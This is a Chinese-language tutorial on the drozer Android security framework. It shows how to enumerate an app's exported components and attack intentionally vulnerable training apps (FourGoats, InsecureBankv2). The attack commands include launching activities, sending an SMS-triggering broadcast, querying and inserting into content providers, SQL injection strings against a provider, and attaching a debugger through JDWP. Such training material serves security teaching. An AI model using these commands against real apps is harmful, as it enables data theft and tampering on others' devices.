# 运行drozer
1. 使用adb，设置端口转发：

> adb forward tcp:31415 tcp:31415

2. 在设备上启动drozer的agent，
3. 按下drozer agent界面的"Embedded Server"滑块，
4. 把"Disabled"滑块拖到右边，
5. 输入下面命令连接drozer console：

> drozer console connect


# 基本操作

## 枚举已安装的包

1. 查看设备中所有已安装的包

> run app.package.list

根据关键字过滤查询包

> run app.package.list -f FourGoats

2. 查看每个包的详细信息，包括：权限、配置、组ID、共享库等

> run app.package.info

3. 获得帮助

> run app.package.info --help

4. 查看制定包的详细信息
> run app.package.info --package com.android.insecurebankv2

或

> run app.package.info -a com.android.insecurebankv2

5. 根据包的权限来查找包

> run app.package.info -p android.permission.INTERNET

## 枚举activity

1. 查看设备上所有导出的activity

> run app.activity.info

2. 查看所有名称中有关键字的activity

> run app.activity.info --filter google

或

> run app.activity.info -f google

3. 查看指定包的activity

> run app.activity.info --package com.android.insecurebankv2

或

> run app.activity.info -a com.android.insecurebankv2

## 枚举content provider

1. 查看设备上所有导出的content provider

> run app.provider.info

2. 查看指定包的信息

> run app.provider.info --package com.android.insecurebankv2

或

> run app.provider.info -a com.android.insecurebankv2

3. 根据权限进行搜索

> run app.provider.info -p [权限标识]

## 枚举service

操作命令和上面类似

> run app.service.info
> run app.service.info --package [包名]
> run app.service.info -p [权限标识]
> run app.service.info -f [过滤字符串]
> run app.service.info --unexported

## 枚举broadcast receiver

常用操作命令和上面类似

> run app.broadcast.info -a [包名]
> run app.broadcast.info -f [过滤字符串]
> run app.broadcast.info --unexported

## 确定app的攻击面

查看可以"exported"组件（可以被其他app使用）有那些：

> run app.package.attacksurface org.owasp.goatdroid.fourgoats

获取activity组建的attack surface信息

>run app.activity.info -a org.owasp.goatdroid.fourgoats
>这个命令显示的activity都是"exported"的

## 攻击activity

可以发送命令直接启动某个指定的activity，操作语法如下：

> run app.activity.start --action [intent action] --category [intent category] --component  [package name] [component name]

示例如下,

> run app.activity.start --component org.owasp.goatdroid.fourgoats  org.owasp.goatdroid.fourgoats.activities.ViewProfile

## 攻击service

查看那些service是导出的

> run app.service.info --permission null

查看某个包的可导出service

> run app.service.info -a org.owasp.goatdroid.fourgoats

启动service的语法如下，

> run app.service.start --action [action] --category [category] --data-uri [DATA-URI] --component  [package name] [component name] --extra [TYPE KEY VALUE] --mimetype [MIMETYPE]

## 攻击broadcast receiver
> run app.broadcast.send --action [action] --category [category] --data-uri [DATA-URI] --component  [package name] [component name] --extra [TYPE KEY VALUE] -flags [FLAGS] --mimetype [MIMETYPE]

示例，

> run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --component org.owasp.goatdroid.fourgoats org.owasp.goatdroid.fourgoats.broadcastreceivers.SendSMSNowReceiver --extra string phoneNumber 1234567890 --extra string message PWNED

## 攻击content provider

查看那些content provider是导出的（不需要权限的），

> run app.provider.info --permission null

查看某个包的可导出content provider

> run app.provider.info -a com.android.insecurebankv2

查找可以访问Content Provider的URI

> run scanner.provider.finduris -a com.android.insecurebankv2

从content中获取数据

> run app.provider.query content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/

~~提取这些数据~~

> ~~run app.provider.download content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/ /sdcard/1~~

~~查看某个文件~~

> ~~run app.provider.read content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/~~

上面应该需要有文件访问权限才行

### SQL注入

使用projection参数和seleciton参数可以传递一些简单的SQL注入语句到Content provider。如

> run app.provider.query content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/ --projection "'"

> run app.provider.query content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/ --selection  "'"

使用sql注入列出数据库中的所有数据表：

> run app.provider.query content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/ --projection "* FROM SQLITE_MASTER WHERE type='table';--"

### 插入数据

查看表的数据结构及各列的名称等信息

> run app.provider.columns content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/ 

插入数据进content provider，语法如下

> run app.provider.insert [URI] [--boolean [name] [value]] [--integer [name] [value]] [--string [name] [value]] ...

示例，

> run app.provider.insert content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/  --int id 10 --string name Tom

## 利用可调试的app

1. 列出设备上所有可调试的app

> run app.package.debuggable

2. 选择一个目标，用下面的命令运行它

> run app.activity.start --component org.owasp.goatdroid.fourgoats org.owasp.goatdroid.fourgoats.activities.Main

3. 运行起来后，使用adb连接java调试连接协议（Java Debug Wire Protocol）端口，它是一个在虚拟机实例上打开的专供调试使用的端口

> adb jdwp

4. adb返回的数字就是可以用来连接VM的端口，但是要在本地计算机上连接它之前，要先用adb转发这一端口，使用下面命令

> adb forward tcp:[本地端口] jdwp:[Android设备上的jdwp端口]
> . 

5. 现在可以从本地访问VM了，命令如下

> jdb -attach localhost:[PORT]

6. 连到Android设备上



# 编写drozer模块

...


